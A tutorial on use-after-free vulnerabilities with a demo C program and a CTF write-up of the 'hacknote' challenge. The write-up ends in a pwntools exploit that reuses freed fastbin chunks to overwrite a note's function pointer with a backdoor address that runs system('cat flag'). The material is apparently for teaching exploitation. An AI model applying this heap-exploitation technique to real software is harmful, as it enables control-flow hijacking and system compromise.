# Use After Free
## Introduction
- Simply put, `Use After Free` is used again when a memory block is released, but in fact there are the following situations here:
  - After the memory block is released, its corresponding pointer is set to `NULL`, and then used again, and the natural program will crash
  - After the memory block is released, its corresponding pointer is not set to `NULL`, and then there is no code to modify this memory block before it is used next time, so the program is likely to run normally
  - After the memory block is released, its corresponding pointer is not set to `NULL`, but before it is used next time, there is code that modifies this piece of memory. Then when the program uses this piece of memory again, strange problems are likely to occur.

- The `Use After Free` vulnerabilities are generally referred to as the latter two. In addition, it is generally said that the memory pointer that is not set to `NULL` after being released is `dangling pointer`

## Vulnerability Principle
- Sample Code

```c
#include <stdio.h>
#include <stdlib.h>

typedef struct name
{
	char *myname;
	void (*func)(char *str);
} NAME;

void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("Call print my name\n"); }

int main(void)
{
	NAME *name;
	name = (NAME *)malloc(sizeof(struct name));
	name->func = myprint;
	name->myname = "h3rmesk1t";
	name->func("This is my function!");
	free(name);
	
	name->func("h3rmesk1t");
	name->func = printmyname;
	name->func("This is my function!");
	name = NULL;
	printf("This program will crash!\n");
	name->func("Can not be printed!");
	
	return 0;
}
```

- In the sample code, a structure `name` is created first, which has two member variables, namely a string pointer of type `char` and a created function pointer, and then two functions are defined:
  - `myprint`, print the passed string
  - `printmyname`, print string`Call print my name`
- In the main function, a structure pointer `name` is first created and space is allocated to it. The `name` member variable of the `func` structure is assigned to the `myprint` function, and the string parameter `This is my function!` is passed, so that the `myname` member variable is assigned to `h3rmesk1t`

![](images/1.png#pic_center)

- Then release the structure `name`, but the structure pointer is not empty after being released. After release, continue to call the `myprint` function in the `func` member variable. I found that the `myprint` function can still be called

![](images/2.png#pic_center)

![](images/3.png#pic_center)

- Then change the function pointer in the `func` member variable to the `printmyname` function, and call the `func` member variable. Although the `printmyname` function does not require parameters, in order to make the program think that it is still the `myprint` function and the operation is legal, the parameter `This is my function` was passed in. Even if the function pointer in the member variable is changed, the `printmyname` function can still be executed smoothly and print out the original function of printing `Call print my name` in the `printmyname` function

![](images/4.png#pic_center)

![](images/5.png#pic_center)

- Then empty the structure `name` and print out a prompt string. At this time, the `func` member variable is called again, and only a prompt slogan will appear. The `func` member variable will not be called to execute the `printmyname` function

## CTF Example Questions
### Static Analysis
- First is a menu to choose

```c
int menu()
{
  puts("----------------------");
  puts(" HackNote ");
  puts("----------------------");zz
  puts(" 1. Add note ");
  puts(" 2. Delete note ");
  puts(" 3. Print note ");
  puts(" 4. Exit ");
  puts("----------------------");
  return printf("Your choice :");
}
```

- In the `add_note` function, the first judgment indicates that at most `5` notes` are created. Next, 5` times are looped. The program will determine whether there is a `malloc` pointer at the location of `notelist + i`.
- `notelist` is actually a global variable in the `bss` segment. The `malloc` pointer, that is, the structure pointer, and its address is `0x0804A070`
- After judging, it is found that there is no structure pointer at this position, then a `8-byte `chunk` will be created, later referred to as `struct_chunk`. It should be noted that because this program is `32-bit, `8-bytes are two address bit widths, which means that the two address bit widths are actually two member variables stored in these two address bit widths.
- After judgment, the `print_note_content_content` function pointer will be placed in the `notelist + i` position. The `print_note_content_content` function needs to pass in an `int` parameter and print out the content at the address of the integer `+4`
- Next, a string will be printed to create the size of `note`. The value input from the external is stored in the `size` variable. The `v0` variable loads the structure pointer in the form of an integer, and opens the `size`chunk` of the size of `size` at the address of the integer `+4`, later referred to as `content_chunk`. Next, it is to determine whether the creation is successful. If the creation is successful, it is prompted to enter the content of `note`. The program will call the `read` function and place the input content at `*((void **)*(&notelist + i) + 1`. Here, the `+1` is actually the address at the width of the address, that is, `content_chunk`. The three parameters of the `read` function are `size`, so overflow cannot be performed here.

```c
unsigned int add_note()
{
  int v0; // ebx
  int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf[8]; // [esp+14h] [ebp-14h] BYREF
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !*(&notelist + i) )
      {
        *(&notelist + i) = malloc(8u);
        if ( !*(&notelist + i) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)*(&notelist + i) = print_note_content;
        printf("Note size :");
        read(0, buf, 8u);
        size = atoi(buf);
        v0 = (int)*(&notelist + i);
        *(_DWORD *)(v0 + 4) = malloc(size);
        if ( !*((_DWORD *)*(&notelist + i) + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)*(&notelist + i) + 1), size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

```c
int __cdecl print_note_content(int a1)
{
  return puts(*(con
st char **)(a1 + 4));
}
```

- In the `del_note` function, first enter the `id` that needs to be deleted. Next, the input number will be assigned to the `v1` variable
- `if` determines whether the input value is legal. If the next `if` determines whether there is a structure in the position of `notelist + v1`. If so, first release `content_chunk`, and then release `struct_chunk`. Here, there is a problem that the `chunk` pointer is not empty after release, which is very likely to trigger `Use After Free`

```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&notelist + v1) )
  {
    free(*((void **)*(&notelist + v1) + 1));
    free(*(&notelist + v1));
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

- In the `print_note` function, first enter the `id` of the `note` that needs to be printed, and then make a legal judgment. The second `if` determines whether there is a structure created at the `notelist + v1` position. If so, print the content in `content_chunk`
- The first `&notelist + v1` represents the `print_note_content_content` function, because when creating the `note` function pointer is placed in the first member variable of the structure. The following `(*(&notelist + v1))` is actually a parameter of the `print_note_content` function. `(*(&notelist + v1))` is actually an address, but after `print_note_content` function is stored, it is cast into an `int` type. After `+4`, `4` is actually added, which is exactly the position of `content_chunk`, which is equivalent to `puts(content_chunk)`

```c
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&notelist + v1) )
    (*(void (__cdecl **)(_DWORD))*(&notelist + v1))(*(&notelist + v1));
  return __readgsdword(0x14u) ^ v3;
}
```

- At the same time, the backdoor function `magic` exists in the program

```c
int magic()
{
  return system("cat flag");
}
```

### Dynamic Analysis
- In static analysis, the following utilization points mainly exist:
  - After the `free` structure is dropped in the `del_note` function, the `chunk` pointer is not empty
  - The address of the `chunk` pointer starts at `notelist` global variable `0x0804A070`
  - The backdoor function `0x08048986` exists

- First try to create two `note` and check the address information of `notelist` global variables

![](images/6.png#pic_center)


- You can see that the `malloc` pointers of the two `notes created are: `0x0804b1a0` and `0x0804b1d0`. Since the `malloc` pointer points to the content part of `chunk`, the complete `0x8` must be subtracted from the complete `chunk` structure.

![](images/7.png#pic_center)

- The structure of the two `notes` is shown in the following figure

![](images/8.png#pic_center)

- Although `chunk` is together, it cannot overflow, there is no modification function, and the structure cannot be constructed. Therefore, we can only start by releasing `chunk` and reapplying `chunk`. Due to the existence of a backdoor function, try to replace the `print` function pointer in the structure with a backdoor function pointer.

- In a `32`bit program, if an `8`byte `chunk` is applied for, and there is a free `16`byte `8+8`chunk` in `bin`, then the `16`byte `chunk` will be extracted directly from `bin`.
- First release `chunk1` and then release `chunk2`. You can see that after releasing `chunk1` and `chunk2`, two `struct chunks are divided into the `0x10` unidirectional linked list of `fastbin`, and two `content chunks are divided into the `0x20` unidirectional linked list of `fastbin`, and the structure diagram is as follows

![](images/9.png#pic_center)

![](images/10.png#pic_center)

- If you apply for `content chunk` and the size is `8`, the program will allocate two `0x10` `chunk` from the `0x10` unidirectional linked list of `fastbin`
- Since `chunk2` is released later, it is removed first in `fastbin`. The `struct chunk` space of the original `chunk2` is re-enabled as `struct chunk` of `chunk3`, and the `struct chunk` space of the original `chunk1` is re-enabled as `content chunk` of `chunk3`, and the structure diagram is shown in the figure

![](images/11.png#pic_center)

- In this way, when creating `chunk3`, write the `system("cat flag")` address directly when writing data to `content chunk`, and then `sys_addr` will be written at the position of the `print` function pointer of `chunk1`
- Since the `chunk` pointer is not empty when released, the printing function of `chunk1` can still be called. At this time, directly select `print_node` in the menu and select `node0` to trigger `system("cat flag")`

### EXP

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')

r = process('./hacknote')

def addnode(size, content):
    r.recvuntil(b'Your choice :')
    r.sendline(b'1')
    r.recvuntil(b'Note size :')
    r.sendline(size)
    r.recvuntil(b'Content :')
    r.sendline(content)

def delnode(index):
    r.recvuntil(b'Your choice :')
    r.sendline(b'2')
    r.recvuntil(b'Index :')
    r.sendline(index)

def printnode(index):
    r.recvuntil(b'Your choice :')
    r.sendline(b'3')
    r.recvuntil(b'Index :')
    r.sendline(index)


magic_addr = 0x08048986
addnode(b'24', b'chunk1')
addnode(b'24', b'chunk2')
delnode(b'0')
delnode(b'1')
addnode(b'8', p32(magic_addr))
printnode(b'0')

r.interactive()
```

![](images/12.png#pic_center)